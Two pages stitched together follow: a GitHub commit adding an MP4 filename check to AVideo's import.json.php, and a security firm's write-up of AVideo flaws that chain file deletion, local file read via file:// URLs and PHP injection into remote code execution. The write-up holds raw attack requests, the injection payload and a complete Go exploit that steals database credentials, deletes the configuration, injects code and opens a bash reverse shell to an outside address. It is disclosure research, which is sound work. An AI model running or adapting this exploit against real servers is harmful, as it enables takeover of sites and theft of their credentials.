=== Content from github.com_7c0eafa0_20250119_124116.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FWWBN%2FAVideo%2Fcommit%2Fecc5f40470bbafff231133f58db1df70f47bfb33)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FWWBN%2FAVideo%2Fcommit%2Fecc5f40470bbafff231133f58db1df70f47bfb33)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fcommit%2Fshow&source=header-repo&source_repo=WWBN%2FAVideo)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[WWBN](/WWBN)
/
**[AVideo](/WWBN/AVideo)**
Public

* [Notifications](/login?return_to=%2FWWBN%2FAVideo) You must be signed in to change notification settings
* [Fork
  978](/login?return_to=%2FWWBN%2FAVideo)
* [Star
   1.9k](/login?return_to=%2FWWBN%2FAVideo)

* [Code](/WWBN/AVideo)
* [Issues
  925](/WWBN/AVideo/issues)
* [Pull requests
  0](/WWBN/AVideo/pulls)
* [Actions](/WWBN/AVideo/actions)
* [Projects
  0](/WWBN/AVideo/projects)
* [Wiki](/WWBN/AVideo/wiki)
* [Security](/WWBN/AVideo/security)
* [Insights](/WWBN/AVideo/pulse)

Additional navigation options

* [Code](/WWBN/AVideo)
* [Issues](/WWBN/AVideo/issues)
* [Pull requests](/WWBN/AVideo/pulls)
* [Actions](/WWBN/AVideo/actions)
* [Projects](/WWBN/AVideo/projects)
* [Wiki](/WWBN/AVideo/wiki)
* [Security](/WWBN/AVideo/security)
* [Insights](/WWBN/AVideo/pulse)

## Commit

[Permalink](/WWBN/AVideo/commit/ecc5f40470bbafff231133f58db1df70f47bfb33)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

https://github.com/WWBN/AVideo/issues/3117

[Browse files](/WWBN/AVideo/tree/ecc5f40470bbafff231133f58db1df70f47bfb33)
Browse the repository at this point in the history

```
If fileURI is not a MP4 file return false
```

* Loading branch information

daniel
authored and
daniel
committed
May 22, 2020

1 parent
[218c98c](/WWBN/AVideo/commit/218c98cbd4a4a2c15745852bcd0f29faf101bd8c)

commit ecc5f40

Showing
**1 changed file**
with
**4 additions**
and
**0 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

4 changes: 4 additions & 0 deletions

4
[objects/import.json.php](#diff-96b89718a7b54b42e6d49428e859647dbab892404c3a58b0783832370fb212bc "objects/import.json.php")

Show comments

[View file](/WWBN/AVideo/blob/ecc5f40470bbafff231133f58db1df70f47bfb33/objects/import.json.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -9,6 +9,10 @@ |
|  |  | return false; |
|  |  | } |
|  |  |  |
|  |  | if(!preg\_match("/.\*\\.mp4$/i", $\_POST['fileURI'])){ |
|  |  | return false; |
|  |  | } |
|  |  |  |
|  |  | $obj = new stdClass(); |
|  |  |  |
|  |  | $obj->error = true; |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `ecc5f40`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FWWBN%2FAVideo%2Fcommit%2Fecc5f40470bbafff231133f58db1df70f47bfb33) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from cube01.io_74805271_20250119_124114.html ===


[Home](https://cube01.io)

# AVideo < 8.9 Privilege Escalation and File Inclusion that let to RCE

This is part of [Cube01](https://cube01.io) researches

In this article we will cover security issues in **AVideo** open-source [project](https://github.com/WWBN/AVideo) that led to RCE.

## Introduction

What is **AVideo** (Audio Video Platform) anyway?

> AVideo is a term that means absolutely nothing, or anything video. Since it doesn't mean anything the brand simply is identifiable with audio video. AVideo Platform is an Audio and Video Platform or simply "A Video Platform".

The project is written in **PHP** and has more **1k** starts on Github and more than **4k** live websites. We did a pentest as a project for a client that use **AVideo** in a live production.

![avideo-1](./img/av-1.png)

The project is intriguing with many functions and files, so we started to work on the platform in order to create a **threat model**.

## Technical Details

After we take a look at the project internals we take few notes that included:

* There are 2 roles in the system: *Admin* and *User*.
* The permissions check depends on the `User::isAdmin()` method.
* The system is vulnerable to **XSS** and **CSRF**.
* The admin user can upload **PHP** files!
* Weak spots in some areas.

#### Privilege Escalation

So in source code reviewing phase we found a lot of interesting endpoints. After taking a deep look into source code

there was an interesting file (*objects/import.json.php*):

```
âx
```
<?php
```
```
global $global, $config;
```
```
if(!isset($global['systemRootPath'])){
```
```
    require_once '../videos/configuration.php';
```
```
}
```
```
header('Content-Type: application/json');
```
```
â
```
```
if (!User::canUpload() || !empty($advancedCustom->doNotShowImportMP4Button)) {
```
```
    return false;
```
```
}
```
```
â
```
```
$obj = new stdClass();
```
```
â
```
```
$obj->error = true;
```
```
â
```
```
$obj->fileURI = pathinfo($_POST['fileURI']);
```
```
â
```
```
//get description
```
```
$filename = $obj->fileURI['dirname'].DIRECTORY_SEPARATOR.$obj->fileURI['filename'];
```
```
$extensions = array('txt', 'html', 'htm');
```
```
â
```
```
$length = intval($_POST['length']);
```
```
if(empty($length) || $length>100){
```
```
    $length = 100;
```
```
}
```
```
â
```
```
foreach ($extensions as $value) {
```
```
    $_POST['description'] = "";
```
```
    $_POST['title'] = "";
```
```
    if(file_exists("{$filename}.{$value}")){
```
```
        $html = file_get_contents("{$filename}.{$value}");
```
```
        $breaks = array("<br />","<br>","<br/>");
```
```
        $html = str_ireplace($breaks, "\r\n", $html);
```
```
        $_POST['description'] = $html;
```
```
        $cleanHTML = strip_tags($html);
```
```
        $_POST['title'] = substr($cleanHTML, 0, $length);
```
```
        break;
```
```
    }
```
```
}
```
```
$tmpDir = sys_get_temp_dir();
```
```
$tmpFileName = $tmpDir.DIRECTORY_SEPARATOR.$obj->fileURI['filename'];
```
```
$source = $obj->fileURI['dirname'].DIRECTORY_SEPARATOR.$obj->fileURI['basename'];
```
```
â
```
```
if (!copy($source, $tmpFileName)) {
```
```
    $obj->msg = "failed to copy $filename...\n";
```
```
    die(json_encode($obj));
```
```
}
```
```
â
```
```
if(!empty($_POST['delete']) && $_POST['delete']!=='false'){
```
```
    if(is_writable($source)){
```
```
        unlink($source);
```
```
        foreach ($extensions as $value) {
```
```
            if(file_exists("{$filename}.{$value}")){
```
```
                unlink("{$filename}.{$value}");
```
```
            }
```
```
        }
```
```
    }else{
```
```
        $obj->msg = "Could not delete $source...\n";
```
```
    }
```
```
}
```
```
â
```
```
$_FILES['upl']['error'] = 0;
```
```
$_FILES['upl']['name'] = $obj->fileURI['basename'];
```
```
$_FILES['upl']['tmp_name'] = $tmpFileName;
```
```
$_FILES['upl']['type'] = "video/mp4";
```
```
$_FILES['upl']['size'] = filesize($tmpFileName);
```
```
â
```
```
require_once $global['systemRootPath'] . 'view/mini-upload-form/upload.php';
```
```
â
```
```
â
```
```
echo json_encode($obj);
```

```

As you can see the check is being done with the following code:

```

```
x
```
```
if (!User::canUpload() || !empty($advancedCustom->doNotShowImportMP4Button)) {
```
```
    return false;
```
```
}
```

```

If the user can upload video and *doNotShowImportMP4Button* is disabled we can pass to the next lines.

The **vulnerable** line is the following at line **51**:

```

```
xxxxxxxxxx
```
```
unlink($source);
```

```

**Why?**

The [unlink](https://www.php.net/manual/en/function.unlink.php) function is designed to delete files and **AVideo** provides a way to reset the web application by deleting the config file in the path */videos/configuration.php*.

The `$source` variable is the file path that has been aggregated at line **42**:

```

```
xxxxxxxxxx
```
```
$source = $obj->fileURI['dirname'].DIRECTORY_SEPARATOR.$obj->fileURI['basename'];// soruce = dir + filename
```

```

`fileURI` is an array that has been assigned at line **16**:

```

```
xxxxxxxxxx
```
```
$obj->fileURI = pathinfo($_POST['fileURI']); // fileURI=../video/configuration.php
```

```

So to delete the config file we have to send a POST request to the *import.json.php* file. Also, we must include a value to `$_POST['delete']` in order to access the code block of the vulnerable line.

There are 2 scenarios to exploit this issue in order to escalate the user's privilege:

* User with upload permission while the *doNotShowImportMP4Button* option is disabled.
* Admin user with disabled dangerous functions (like upload PHP files) in case of `$global['disableAdvancedConfigurations'] = 1;` it is like safe mode where admin can do nothing harmful to the server [more info](https://github.com/WWBN/AVideo/issues/3112#issuecomment-632051100).

![avideo-4](./img/av-4.png)

As a result, we created a user with upload permission and disabled the *doNotShowImportMP4Button*. We sent the following request using Burp Suite:

```

```
x
```
```
POST /avideo/objects/import.json.php HTTP/1.1
```
```
Host: 127.0.0.1
```
```
Cache-Control: max-age=0
```
```
Upgrade-Insecure-Requests: 1
```
```
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
```
```
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
```
```
Sec-Fetch-Site: same-origin
```
```
Sec-Fetch-Mode: navigate
```
```
Sec-Fetch-User: ?1
```
```
Sec-Fetch-Dest: document
```
```
Accept-Encoding: gzip, deflate
```
```
Accept-Language: en-US,en;q=0.9
```
```
Cookie: http127001avideo=6t52ec7dsiojanu6feim3bg8ml;
```
```
Connection: close
```
```
Content-Length: 44
```
```
â
```
```
delete=1&fileURI=../videos/configuration.php
```

```

After sending the request the file was deleted and we got redirected to install page!

![avideo-2](./img/av-2.png)

We filed a bug but there is more!

#### File Inclusion

In case you were able to reproduce the previous vulnerability there are 2 points that you should take care of:

* What if MySQL credential is not the default?
* What if you can't initiate a remote sql connection?

Under those circumstances we have to find the current database credential. And that's what we did!

We scanned the plugin folder in order to find interesting functions and we found something in */plugin/LiveLinks/proxy.php*

```

```
x
```
```
<?php
```
```
â
```
```
require_once '../../videos/configuration.php';
```
```
session_write_close();
```
```
try {
```
```
    $global['mysqli']->close();
```
```
} catch (Exception $exc) {
```
```
    //echo $exc->getTraceAsString();
```
```
}
```
```
â
```
```
â
```
```
/*
```
```
 * this file is to handle HTTP URLs into HTTPS
```
```
 */
```
```
if (!filter_var($_GET['livelink'], FILTER_VALIDATE_URL)) {
```
```
    echo "Invalid Link";
```
```
    exit;
```
```
}
```
```
header("Content-Type: video/vnd.mpegurl");
```
```
header("Content-Disposition: attachment;filename=playlist.m3u");
```
```
$content = url_get_contents($_GET['livelink']);
```
```
$pathinfo = pathinfo($_GET['livelink']);
```
```
foreach (preg_split("/((\r?\n)|(\r\n?))/", $content) as $line) {
```
```
    $line = trim($line);
```
```
    if (!empty($line) && $line[0] !== "#") {
```
```
        if (!filter_var($line, FILTER_VALIDATE_URL)) {
```
```
            if(!empty($pathinfo["extension"])){
```
```
                $_GET['livelink'] = str_replace($pathinfo["basename"], "", $_GET['livelink']);
```
```
            }
```
```
            $line = $_GET['livelink'].$line;
```
```
        }
```
```
    }
```
```
    echo $line.PHP_EOL;
```
```
}
```

```

The line below is vulnerable to [File Inclusion](https://www.offensive-security.com/metasploit-unleashed/file-inclusion-vulnerabilities/)

```

```
xxxxxxxxxx
```
```
$content = url_get_contents($_GET['livelink']);
```

```

And even more there are no authentication check so anyone can exploit this issue by sending a GET request to the file

However, we must bypass the check in the following code

```

```
xxxxxxxxxx
```
```
if (!filter_var($_GET['livelink'], FILTER_VALIDATE_URL)) {
```
```
    echo "Invalid Link";
```
```
    exit;
```
```
}
```

```

We only need a valid URL with any URI scheme (file://, ftp://, php://, ...etc) in this case I can read the *configuration.php* file using the [file URI scheme](https://en.wikipedia.org/wiki/File_URI_scheme) (file:///C:/xampp/htdocs/AVideo/videos/configuration.php)

![avideo-3](./img/av-3.png)

We have the database credential now :)

#### Remote Code Execution

After this we can achieve **RCE** using pulgin upload in case of the permissions is limited for the plugin folder we found another way to execute the **PHP** code using the install folder. In */install/checkConfiguration.php* there is way to inject **PHP** code in *configuration.php* file.

```

```
x
```
```
if(empty($_POST['salt'])){
```
```
    $_POST['salt'] = uniqid();
```
```
}
```
```
$content = "<?php
```
```
\$global['configurationVersion'] = 2;
```
```
\$global['disableAdvancedConfigurations'] = 0;
```
```
\$global['videoStorageLimitMinutes'] = 0;
```
```
if(!empty(\$_SERVER['SERVER_NAME']) && \$_SERVER['SERVER_NAME']!=='localhost' && !filter_var(\$_SERVER['SERVER_NAME'], FILTER_VALIDATE_IP)) {
```
```
    // get the subdirectory, if exists
```
```
    \$subDir = str_replace(array(\$_SERVER[\"DOCUMENT_ROOT\"], 'videos/configuration.php'), array('',''), __FILE__);
```
```
    \$global['webSiteRootURL'] = \"http\".(!empty(\$_SERVER['HTTPS'])?\"s\":\"\").\"://\".\$_SERVER['SERVER_NAME'].\$subDir;
```
```
}else{
```
```
    \$global['webSiteRootURL'] = '{$_POST['webSiteRootURL']}';
```
```
}
```
```
\$global['systemRootPath'] = '{$_POST['systemRootPath']}';
```
```
\$global['salt'] = '{$_POST['salt']}'; // RCE at this line
```
```
\$global['disableTimeFix'] = 0;
```
```
\$global['enableDDOSprotection'] = 1;
```
```
\$global['ddosMaxConnections'] = 40;
```

```

We just need to pass `$_POST['salt']` as: `123'; exec($_GET["x"]);//`

Then visit <http://127.0.0.1/avideo/videos/configuration.php?x=>[OS\_COMMAND\_HERE]

So we are now able to execute system commands in the server!

## Exploit

Now it is the time to combine all of these findings in order to gain shell on the vulnerable system. First, you must turn off *doNotShowImportMP4Button* in order to the exploit works.

You can find the exploit in GitHub [here](https://github.com/ahussam/AVideo3xploit) or copy it from here:

```

```
x
```
```
package main
```
```
â
```
```
import (
```
```
    "encoding/json"
```
```
    "io/ioutil"
```
```
    "net/http"
```
```
    "net/url"
```
```
    "os"
```
```
    "strings"
```
```
â
```
```
    "github.com/fatih/color"
```
```
)
```
```
â
```
```
type credential struct {
```
```
    mysqlHost string
```
```
    mysqlUser string
```
```
    mysqlPass string
```
```
}
```
```
â
```
```
type advancedCustom struct {
```
```
    DoNotShowImportMP4Button bool
```
```
}
```
```
â
```
```
type cookie struct {
```
```
    name  string
```
```
    value string
```
```
}
```
```
â
```
```
func checkRequirments(link string) bool {
```
```
    var setting advancedCustom
```
```
    rs, err := http.Get(link + "plugin/CustomizeAdvanced/advancedCustom.json.php")
```
```
    if err != nil {
```
```
        color.Red("[x] Unable to check requirments")
```
```
        panic(err)
```
```
    }
```
```
    defer rs.Body.Close()
```
```
    jsonRes, err := ioutil.ReadAll(rs.Body)
```
```
    if err != nil {
```
```
        panic(err)
```
```
    } else {
```
```
        json.Unmarshal(jsonRes, &setting)
```
```
â
```
```
        if setting.DoNotShowImportMP4Button {
```
```
            return false
```
```
        } else {
```
```
            return true
```
```
        }
```
```
â
```
```
    }
```
```
}
```
```
â
```
```
func login2cookie(link string, user string, password string) cookie {
```
```
â
```
```
    var c cookie
```
```
    resp, err := http.PostForm(link+"objects/login.json.php",
```
```
        url.Values{"user": {user}, "pass": {password}, "rememberme": {"false"}})
```
```
â
```
```
    if err != nil {
```
```
        color.Red("[x] Unable to login")
```
```
        panic(err)
```
```
    }
```
```
    defer resp.Body.Close()
```
```
    body, err := ioutil.ReadAll(resp.Body)
```
```
    stringBody := string(body)
```
```
    user = strings.Split(strings.Split(stringBody, "\"user\":")[1], ",")[0]
```
```
â
```
```
    if user == "false" {
```
```
â
```
```
        color.Red("[x] Unable to login (wrong username/password)")
```
```
        os.Exit(1)
```
```
    }
```
```
    for _, cookie := range resp.Cookies() {
```
```
        if cookie.Name != "user" && cookie.Name != "pass" && cookie.Name != "rememberme" {
```
```
            c.name = cookie.Name
```
```
            c.value = cookie.Value
```
```
        }
```
```
    }
```
```
â
```
```
    color.Green("[x] Logged in successfully!")
```
```
â
```
```
    return c
```
```
}
```
```
â
```
```
func readConfig(link string) credential {
```
```
â
```
```
    var cred credential
```
```
    // File path is set to ubuntu change it based on the server os and filename
```
```
    resp, err := http.Get(link + "plugin/LiveLinks/proxy.php?livelink=file:///C:/xampp/htdocs/AVideo/videos/configuration.php")
```
```
    if err != nil {
```
```
        color.Red("[X] Unable to read config file")
```
```
        panic(err)
```
```
    }
```
```
â
```
```
    defer resp.Body.Close()
```
```
    body, err := ioutil.ReadAll(resp.Body)
```
```
    stringBody := string(body)
```
```
    cred.mysqlHost = strings.Split(strings.Split(stringBody, "$mysqlHost = '")[1], "'")[0]
```
```
    cred.mysqlUser = strings.Split(strings.Split(stringBody, "$mysqlUser = '")[1], "'")[0]
```
```
    cred.mysqlPass = strings.Split(strings.Split(stringBody, "$mysqlPass = '")[1], "'")[0]
```
```
â
```
```
    color.Green("[X] Config file has been read!")
```
```
â
```
```
    return cred
```
```
}
```
```
â
```
```
func deleteConfig(link string, c cookie) {
```
```
â
```
```
    client := &http.Client{}
```
```
    PostData := strings.NewReader("delete=1&fileURI=../videos/configuration.php")
```
```
â
```
```
    req, err := http.NewRequest("POST", link+"objects/import.json.php", PostData)
```
```
â
```
```
    // Set cookie
```
```
    req.Header.Set("Cookie", c.name+"="+c.value)
```
```
â
```
```
    req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
```
```
â
```
```
    _, err = client.Do(req)
```
```
    if err != nil {
```
```
        color.Red("[x] Unable to delete config file!")
```
```
        panic(err)
```
```
    }
```
```
â
```
```
    color.Green("[x] Config file has been deleted!")
```
```
â
```
```
}
```
```
â
```
```
func injectCode(link string, cred credential) {
```
```
â
```
```
    rceCode := "x';echo exec($_GET[\"x\"]); ?>" // PHP code that will be injected in the configuration file
```
```
â
```
```
    client := &http.Client{}
```
```
â
```
```
    // Change systemRootPath based on the OS
```
```
    PostData := strings.NewReader(`webSiteRootURL=` + link + `&systemRootPath=/var/www/html/avideo/&webSiteTitle=AVideo&databaseHost=` + cred.mysqlHost + `&databasePort=3306&databaseUser=` + cred.mysqlUser + `&databasePass=` + cred.mysqlPass + `&databaseName=aVideo212&mainLanguage=en&systemAdminPass=123456&contactEmail=tes@test.com&createTables=2&salt=` + rceCode)
```
```
â
```
```
    req, err := http.NewRequest("POST", link+"install/checkConfiguration.php", PostData)
```
```
    req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
```
```
â
```
```
    _, err = client.Do(req)
```
```
â
```
```
    if err != nil {
```
```
        color.Red("[x] Unable to inject code!")
```
```
        panic(err)
```
```
    }
```
```
â
```
```
    color.Green("[x] Code has been injected into the config file!")
```
```
â
```
```
    // Initate the reverse shell (reverse shell)
```
```
â
```
```
    _, err = http.Get(link + "videos/configuration.php?x=%2Fbin%2Fbash -c 'bash -i > %2Fdev%2Ftcp%2F192.168.153.138%2F8080 0>%261'%0A")
```
```
    if err != nil {
```
```
        color.Red("[X] Unable to send request!")
```
```
        panic(err)
```
```
    }
```
```
    color.Green("[x] Check your nc ;)")
```
```
â
```
```
}
```
```
â
```
```
func main() {
```
```
    var reqCookie cookie
```
```
    var dbCredential credential
```
```
â
```
```
    args := os.Args[1:]
```
```
â
```
```
    if len(args) < 3 {
```
```
        color.Red("Missing arguments")
```
```
        os.Exit(1)
```
```
    }
```
```
â
```
```
    url := args[0] // link
```
```
    u := args[1]   // username
```
```
    p := args[2]   // password
```
```
â
```
```
    // Check doNotShowImportMP4Button status
```
```
    if !checkRequirments(url) {
```
```
        color.Red("[x] doNotShowImportMP4Button is not disabled! exploit won't work :( if you are admin disable it from advancedCustom plugin")
```
```
        os.Exit(1)
```
```
    }
```
```
â
```
```
    // Get database credentials
```
```
    dbCredential = readConfig(url)
```
```
â
```
```
    // Get user cookie
```
```
    reqCookie = login2cookie(url, u, p)
```
```
â
```
```
    // Delete config
```
```
    deleteConfig(url, reqCookie)
```
```
â
```
```
    // Inject PHP code
```
```
    injectCode(url, dbCredential)
```
```
â
```
```
}
```
```
â
```

```

**Usage**

```

```
go run AVideo3xploit.go http://[target]/avideo/ username password
```

```

Tested on **Ubuntu** latest version, result:

![avideo-5](./img/av-5.png)

## New Project Idea

We will publish the static analyzer that we created during the pentest [here](https://github.com/ahussam/PHPredator)

## What now?

If you think your site/app/network are secure and want to make sure about that then

give us a call contact@cube01.io


